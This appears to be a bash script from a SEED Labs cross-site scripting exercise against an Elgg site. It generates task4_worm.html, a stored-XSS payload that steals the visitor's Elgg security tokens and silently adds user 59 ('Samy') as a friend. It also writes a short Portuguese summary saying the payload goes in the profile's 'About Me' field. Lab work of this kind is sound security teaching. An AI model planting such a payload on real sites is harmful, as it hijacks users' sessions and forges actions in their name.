#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SAMY_GUID="59"

cat > "$SCRIPT_DIR/task4_worm.html" <<EOF
<script type="text/javascript">
window.onload = function () {
  var ts = elgg.security.token.__elgg_ts;
  var token = elgg.security.token.__elgg_token;
  var endpoint = elgg.config.wwwroot + "action/friends/add?friend=${SAMY_GUID}" +
                 "&__elgg_ts=" + ts +
                 "&__elgg_token=" + token;

  var req = new XMLHttpRequest();
  req.open("GET", endpoint, true);
  req.send(null);
};
</script>
EOF

cat > "$SCRIPT_DIR/task4_resumo.txt" <<'EOF'
Task 4
- URL do pedido: http://www.seed-server.com/action/friends/add
- Metodo observado: GET
- Parametro principal: friend=59
- Parametros necessarios: __elgg_ts e __elgg_token
- Local onde o payload deve ser colocado: campo About Me do perfil do Samy, em modo Text
EOF

printf 'Criados: task4_worm.html e task4_resumo.txt\n'
